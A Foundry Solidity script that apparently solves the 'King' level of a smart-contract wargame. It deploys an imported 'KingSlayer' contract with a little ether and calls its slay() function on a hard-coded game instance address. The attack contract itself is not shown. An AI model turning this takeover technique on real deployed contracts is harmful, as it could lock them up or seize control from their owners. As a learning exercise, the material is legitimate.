// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {King, KingSlayer} from "../src/Lv-09/King.sol";

contract KingScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN King INSTANCE ADDRESS
        KingSlayer _slayer = new KingSlayer{value: 0.001000001 ether}();
        _slayer.slay(0xCB564C1F7bEa30DCf5762d9BEb5FF67bDd1758E4);

        vm.stopBroadcast();
    }
}
